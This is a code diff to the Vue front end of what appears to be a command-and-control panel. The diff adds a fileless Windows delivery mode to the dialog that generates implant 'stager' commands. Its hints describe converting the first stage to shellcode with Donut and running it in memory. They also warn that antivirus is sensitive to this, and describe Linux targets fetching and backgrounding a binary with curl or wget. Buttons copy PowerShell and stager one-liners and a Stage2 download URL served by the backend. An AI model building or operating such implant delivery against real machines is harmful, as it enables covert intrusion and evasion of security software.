@@ -126,22 +126,54 @@
       </el-table>
     </section>
 
-    <el-dialog v-model="stagerVisible" title="快速上线命令" width="680px" class="premium-dialog">
+    <el-dialog v-model="stagerVisible" title="快速上线命令" width="720px" class="premium-dialog">
       <div class="dialog-stack">
         <el-radio-group v-model="stagerPlatform" @change="fetchStager">
           <el-radio-button label="windows">Windows</el-radio-button>
           <el-radio-button label="linux">Linux</el-radio-button>
         </el-radio-group>
 
+        <el-radio-group
+          v-if="stagerPlatform === 'windows'"
+          v-model="stagerDelivery"
+          @change="fetchStager"
+          style="margin-top: 8px"
+        >
+          <el-radio-button label="disk">落盘 EXE</el-radio-button>
+          <el-radio-button label="fileless">内存上线</el-radio-button>
+        </el-radio-group>
+
         <div class="stager-section" v-loading="stagerLoading">
-          <h4 class="stager-title">{{ stagerPlatform === 'windows' ? 'Windows 上线命令' : 'Linux 上线命令' }}</h4>
-          <p class="dialog-hint" v-if="stagerPlatform === 'windows'">
+          <h4 class="stager-title">
+            {{ stagerPlatform === 'windows' ? 'Windows' : 'Linux' }}
+            ·
+            {{ stagerDelivery === 'fileless' && stagerPlatform === 'windows' ? '内存上线' : '落盘' }}
+          </h4>
+          <p class="dialog-hint" v-if="stagerPlatform === 'windows' && stagerDelivery === 'disk'">
             目标机从面板地址下载载荷，Agent 回连到监听器地址。需先有 server/assets 下的 client_template_*。
+          </p>
+          <p class="dialog-hint" v-else-if="stagerPlatform === 'windows' && stagerDelivery === 'fileless'">
+            将 Stage0 打成 shellcode（Donut）后内存执行。与「上线后跑 BOF」无关。Stage2 约 10 分钟有效。杀软敏感，实验室优先。
           </p>
           <p class="dialog-hint" v-else>
             使用 curl/wget 从面板下载二进制并后台执行。Linux 模板需 compile_linux.sh 生成。
           </p>
-          <div class="terminal-box">
+
+          <template v-if="stagerDelivery === 'fileless' && stagerPlatform === 'windows'">
+            <p class="dialog-hint" v-if="stagerStage2Url">
+              Stage2：<code>{{ stagerStage2Url }}</code>
+              <span v-if="stagerStage2Bytes">（{{ stagerStage2Bytes }} 字节）</span>
+            </p>
+            <h5 class="stager-sub">PowerShell</h5>
+            <div class="terminal-box">
+              <pre><code>{{ stagerCommandPs || '暂无' }}</code></pre>
+            </div>
+            <h5 class="stager-sub">cupcake-stager</h5>
+            <div class="terminal-box">
+              <pre><code>{{ stagerCommandStager || '暂无' }}</code></pre>
+            </div>
+          </template>
+          <div class="terminal-box" v-else>
             <div class="terminal-box__dots">
               <span></span>
               <span></span>
@@ -154,7 +186,12 @@
 
       <template #footer>
         <el-button @click="stagerVisible = false">关闭</el-button>
-        <el-button type="primary" :disabled="!stagerCommand" @click="copyText(stagerCommand)">
+        <template v-if="stagerDelivery === 'fileless' && stagerPlatform === 'windows'">
+          <el-button :disabled="!stagerCommandPs" @click="copyText(stagerCommandPs)">复制 PS</el-button>
+          <el-button :disabled="!stagerCommandStager" @click="copyText(stagerCommandStager)">复制 Stager</el-button>
+          <el-button type="primary" :disabled="!stagerStage2Url" @click="copyText(stagerStage2Url)">复制 Stage2 URL</el-button>
+        </template>
+        <el-button v-else type="primary" :disabled="!stagerCommand" @click="copyText(stagerCommand)">
           <el-icon><CopyDocument /></el-icon>
           复制命令
         </el-button>
@@ -269,7 +306,12 @@ const listenAddr = ref('0.0.0.0:8081')
 const stagerVisible = ref(false)
 const stagerLoading = ref(false)
 const stagerCommand = ref('')
+const stagerCommandPs = ref('')
+const stagerCommandStager = ref('')
+const stagerStage2Url = ref('')
+const stagerStage2Bytes = ref(0)
 const stagerPlatform = ref('windows')
+const stagerDelivery = ref('disk') // disk | fileless
 const currentListener = ref(null)
 
 const form = reactive({
@@ -397,6 +439,7 @@ const handleDelete = (id) => {
 
 const openStagerDialog = (row) => {
   currentListener.value = row
+  stagerDelivery.value = 'disk'
   stagerVisible.value = true
   fetchStager()
 }
@@ -406,6 +449,8 @@ const fetchStager = async () => {
   stagerLoading.value = true
   // 回连 host：监听器 public_host 或本机主机名；下载地址由后端用面板 Host 生成
   const host = currentListener.value.public_host || window.location.hostname
+  const delivery =
+    stagerPlatform.value === 'windows' ? stagerDelivery.value || 'disk' : 'disk'
   try {
     const res = await api.get('/api/stager', {
       params: {
@@ -413,17 +458,34 @@ const fetchStager = async () => {
         os: stagerPlatform.value,
         arch: 'x64',
         host,
-        profile: 'standard'
+        profile: 'reverse',
+        delivery
       }
     })
-    let cmd = res.data.command || ''
-    if (res.data.command_ps) {
-      cmd = `${cmd}\n\n:: PowerShell 备选\n${res.data.command_ps}`
+    const d = res.data || {}
+    stagerCommandPs.value = d.command_ps || ''
+    stagerCommandStager.value = d.command_stager || ''
+    stagerStage2Url.value = d.stage2_url || d.download || ''
+    stagerStage2Bytes.value = d.stage2_bytes || 0
+    if (delivery === 'fileless') {
+      stagerCommand.value = d.command_ps || d.command || ''
+    } else {
+      // 落盘：CMD 推荐 + PS 备选分行展示
+      const cmd = d.command_cmd || d.command || ''
+      const ps = d.command_ps || ''
+      stagerCommand.value = ps
+        ? `:: CMD 推荐\n${cmd}\n\n:: PS 直拉 x64\n${ps}`
+        : cmd
     }
-    stagerCommand.value = cmd
   } catch (e) {
     stagerCommand.value = ''
-    ElMessage.error(e?.response?.data?.error || 'stager 生成失败（请确认 assets 下已有 client_template_*）')
+    stagerCommandPs.value = ''
+    stagerCommandStager.value = ''
+    stagerStage2Url.value = ''
+    stagerStage2Bytes.value = 0
+    const msg = e?.response?.data?.error || 'stager 生成失败（请确认 assets 下已有 client_template_*）'
+    const hint = e?.response?.data?.hint
+    ElMessage.error(hint ? `${msg}（${hint}）` : msg)
   } finally {
     stagerLoading.value = false
   }
@@ -581,6 +643,12 @@ onMounted(fetchListeners)
 
 .stager-section {
   margin-bottom: 20px;
+}
+
+.stager-sub {
+  margin: 12px 0 6px;
+  font-size: 13px;
+  font-weight: 600;
 }
 
 .stager-title {
